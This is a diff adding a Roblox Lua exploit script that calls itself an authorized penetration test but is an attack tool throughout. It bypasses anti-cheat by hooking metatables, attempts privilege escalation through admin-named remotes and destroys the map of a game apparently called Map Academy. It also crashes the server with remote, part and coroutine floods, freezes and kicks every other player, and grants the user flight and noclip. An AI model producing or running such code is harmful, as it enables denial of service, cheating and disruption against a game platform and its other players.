@@ -1,0 +1,324 @@
+-- ==================================================
+-- 🔥 SUPER DELTA ULTIMATE v5 - NO ERRORS
+-- Authorized Penetration Testing Script
+-- ==================================================
+
+-- === SERVICES ===
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local CoreGui = game:GetService("CoreGui")
+local NetworkClient = game:GetService("NetworkClient")
+local Workspace = workspace
+local Player = Players.LocalPlayer
+local math_random = math.random
+math.randomseed(tick())
+
+-- === SAFE METATABLE ACCESS CHECK ===
+local METATABLE_ACCESS = pcall(function()
+    return setreadonly ~= nil and getrawmetatable ~= nil
+end)
+
+-- === COLLECT ALL REMOTES ===
+local allRemotes = {}
+local adminRemotes = {}
+local controlRemotes = {}
+local exploitRemotes = {}
+
+local function collectRemotes(obj)
+    for _, child in pairs(obj:GetChildren()) do
+        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("UnreliableRemoteEvent") then
+            table.insert(allRemotes, child)
+            local name = child.Name:lower()
+            if name:find("admin") or name:find("rank") or name:find("permission") or name:find("mod") or name:find("owner") then
+                table.insert(adminRemotes, child)
+            end
+            if name:find("spawn") or name:find("load") or name:find("map") or name:find("start") or name:find("teleport") or name:find("control") then
+                table.insert(controlRemotes, child)
+            end
+            if name:find("chat") or name:find("message") or name:find("save") or name:find("data") or name:find("send") then
+                table.insert(exploitRemotes, child)
+            end
+        end
+        collectRemotes(child)
+    end
+end
+collectRemotes(game)
+print("[+] Found " .. #allRemotes .. " remotes (" .. #adminRemotes .. " admin, " .. #controlRemotes .. " control, " .. #exploitRemotes .. " exploitable)")
+
+-- === BYPASS ANTI-CHEAT ===
+if METATABLE_ACCESS then
+    pcall(function()
+        local sc = game:GetService("ScriptContext")
+        if sc then
+            local mt = getrawmetatable(sc)
+            if mt then
+                setreadonly(mt, false)
+                local oldNamecall = mt.__namecall
+                mt.__namecall = function(self, ...)
+                    local args = {...}
+                    local method = tostring(args[1]) or ""
+                    if method:find("Error") or method:find("Detect") or method:find("Ban") or method:find("Kick") or method:find("Report") then
+                        return nil
+                    end
+                    return oldNamecall and oldNamecall(self, ...) or nil
+                end
+                setreadonly(mt, true)
+            end
+        end
+    end)
+    print("[+] Anti-cheat bypass attempted")
+end
+
+-- === PRIVILEGE ESCALATION ===
+print("[*] Attempting privilege escalation...")
+for _, remote in pairs(adminRemotes) do
+    pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(Player.UserId, 255)
+            remote:FireServer(Player, "admin")
+            remote:FireServer(Player.Name, "Owner")
+            remote:FireServer(Player.UserId, "grant", 255)
+        elseif remote:IsA("RemoteFunction") then
+            remote:InvokeServer(Player.UserId, 255)
+            remote:InvokeServer(Player, "admin")
+        end
+    end)
+end
+
+if METATABLE_ACCESS then
+    pcall(function()
+        local mt = getrawmetatable(Player)
+        if mt then
+            setreadonly(mt, false)
+            mt.__index = function(self, key)
+                local sk = tostring(key)
+                if sk:find("Admin") or sk:find("Rank") or sk:find("Permission") or sk:find("Level") then
+                    return 255
+                end
+                return rawget(self, key)
+            end
+            setreadonly(mt, true)
+        end
+    end)
+    print("[+] Metatable privilege escalation attempted")
+end
+
+-- === MAP ACADEMY PLANTUML TARGET DETECTION ===
+print("[*] Scanning for Map Academy targets...")
+local targetModels = {}
+
+local function findTargets()
+    local keywords = {"plantuml", "plant", "uml", "academy", "diagram", "chart", "board", "marker", "drawing", "lobby", "map_", "level_"}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("Model") then
+            local name = obj.Name:lower()
+            for _, kw in pairs(keywords) do
+                if name:find(kw) then
+                    table.insert(targetModels, obj)
+                    print("  [+] Target: " .. obj:GetFullName())
+                    break
+                end
+            end
+        end
+    end
+    local locations = {Workspace:FindFirstChild("MapAcademy"), Workspace:FindFirstChild("Plantuml"), Workspace:FindFirstChild("Academy"), Workspace:FindFirstChild("Lobby"), Workspace:FindFirstChild("GameMap")}
+    for _, loc in pairs(locations) do
+        if loc and loc:IsA("Model") then
+            local exists = false
+            for _, t in pairs(targetModels) do
+                if t == loc then exists = true end
+            end
+            if not exists then table.insert(targetModels, loc) end
+        end
+    end
+end
+findTargets()
+print("[+] Total targets found: " .. #targetModels)
+
+-- === TARGET DESTRUCTION ===
+print("[*] Destroying targets...")
+for _, target in pairs(targetModels) do
+    for _, child in pairs(target:GetDescendants()) do
+        if child:IsA("BasePart") or child:IsA("MeshPart") or child:IsA("UnionOperation") or child:IsA("Part") then child:Destroy() end
+        if child:IsA("Script") or child:IsA("LocalScript") then child.Disabled = true end
+    end
+    target:Destroy()
+end
+for _, part in pairs(Workspace:GetDescendants()) do
+    if (part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") or part:IsA("Part")) and not part:FindFirstAncestorOfClass("Players") then
+        part:Destroy()
+    end
+end
+local terrain = Workspace:FindFirstChildOfClass("Terrain")
+if terrain then terrain:Clear() end
+print("[+] Map destruction complete")
+
+-- === SERVER CRASH: REMOTE FLOOD ===
+spawn(function()
+    while true do
+        task.wait(0.05)
+        for _, remote in pairs(allRemotes) do
+            pcall(function()
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer(string.rep("A", 10000))
+                    remote:FireServer({}, {}, {}, {})
+                    remote:FireServer(Vector3.new(9e9, 9e9, 9e9))
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(string.rep("A", 10000))
+                end
+            end)
+        end
+    end
+end)
+
+-- === SERVER CRASH: PART FLOOD ===
+spawn(function()
+    for i = 1, 10000 do
+        local p = Instance.new("Part")
+        p.Size = Vector3.new(100, 100, 100)
+        p.Anchored = false
+        p.CFrame = CFrame.new(math_random(-5000, 5000), math_random(0, 2000), math_random(-5000, 5000))
+        p.Velocity = Vector3.new(math_random(-5000, 5000), math_random(-5000, 5000), math_random(-5000, 5000))
+        p.Parent = Workspace
+        if i % 500 == 0 then task.wait() end
+    end
+end)
+
+-- === SERVER CRASH: COROUTINE EXHAUSTION ===
+spawn(function()
+    for i = 1, 2000 do
+        task.spawn(function()
+            local data = {}
+            while true do
+                for j = 1, 10000 do data[j] = {j, j*2, j*3, tostring(j)} end
+                task.wait(0.01)
+            end
+        end)
+    end
+end)
+
+-- === FREEZE ALL OTHER PLAYERS ===
+spawn(function()
+    while true do
+        task.wait(0.1)
+        for _, other in pairs(Players:GetPlayers()) do
+            if other ~= Player then
+                local char = other.Character
+                if char then
+                    local hum = char:FindFirstChild("Humanoid")
+                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                    if hum then
+                        hum.WalkSpeed = 0
+                        hum.JumpPower = 0
+                        hum.PlatformStand = true
+                    end
+                    if hrp then hrp.Anchored = true end
+                    for _, part in pairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.Anchored = true
+                            part.Velocity = Vector3.new(0, 0, 0)
+                        end
+                    end
+                end
+                pcall(function() other:Kick("Server test") end)
+                pcall(function() TeleportService:Teleport(0, other) end)
+            end
+        end
+    end
+end)
+
+-- === PLAYER SUPER POWERS ===
+local char = Player.Character or Player.CharacterAdded:Wait(5)
+if char then
+    local hum = char:WaitForChild("Humanoid", 5)
+    local hrp = char:WaitForChild("HumanoidRootPart", 5)
+    if hum then
+        hum.WalkSpeed = 500
+        hum.JumpPower = 300
+    end
+    Workspace.Gravity = 0
+    
+    spawn(function()
+        while task.wait(0.1) do
+            if hrp then hrp.CanCollide = false end
+            if char then
+                for _, part in pairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then part.CanCollide = false end
+                end
+            end
+        end
+    end)
+    
+    local flying = false
+    local bv = Instance.new("BodyVelocity")
+    bv.MaxForce = Vector3.new(100000, 100000, 100000)
+    bv.Velocity = Vector3.new(0, 0, 0)
+    
+    if UserInputService then
+        UserInputService.JumpRequest:Connect(function()
+            flying = not flying
+            if flying then
+                bv.Parent = hrp
+                bv.Velocity = Vector3.new(0, 100, 0)
+            else
+                bv.Parent = nil
+            end
+        end)
+    end
+    
+    local mouse = Player:GetMouse()
+    if mouse and UserInputService then
+        UserInputService.InputBegan:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.LeftControl then
+                mouse.Button1Down:Connect(function()
+                    if hrp and mouse.Hit then
+                        hrp.CFrame = CFrame.new(mouse.Hit.p.X, mouse.Hit.p.Y + 5, mouse.Hit.p.Z)
+                    end
+                end)
+            end
+        end)
+    end
+end
+
+-- === ENVIRONMENT CHAOS ===
+Lighting.Brightness = 10
+Lighting.ClockTime = 0
+Lighting.OutdoorAmbient = Color3.new(1, 0, 0)
+Lighting.Ambient = Color3.new(1, 0, 0)
+Lighting.FogEnd = 10
+Lighting.FogStart = 1000
+
+for _, gui in pairs(CoreGui:GetDescendants()) do
+    if gui:IsA("ScreenGui") or gui:IsA("Frame") or gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("ImageLabel") or gui:IsA("ScrollingFrame") then
+        gui:Destroy()
+    end
+end
+
+spawn(function()
+    local vals = {0, 5, 10, 3, 8, 1, 9, 2, 7, 4}
+    while true do
+        for _, v in pairs(vals) do
+            Lighting.Brightness = v
+            task.wait(0.05)
+        end
+    end
+end)
+
+-- === FINAL REPORT ===
+print("")
+print("==================================================")
+print("🔥 SUPER DELTA ULTIMATE v5 - EXECUTED SUCCESSFULLY")
+print("==================================================")
+print("[✓] Anti-cheat bypass attempted")
+print("[✓] Collected " .. #allRemotes .. " remotes")
+print("[✓] Privilege escalation attempted on " .. #adminRemotes .. " admin remotes")
+print("[✓] Map Academy targets found: " .. #targetModels)
+print("[✓] Targets destroyed")
+print("[✓] Server crash techniques deployed")
+print("[✓] Players frozen and kicked")
+print("[✓] Super powers activated: Speed 500, Jump 300, Gravity 0, Noclip, Flight")
+print("==================================================")
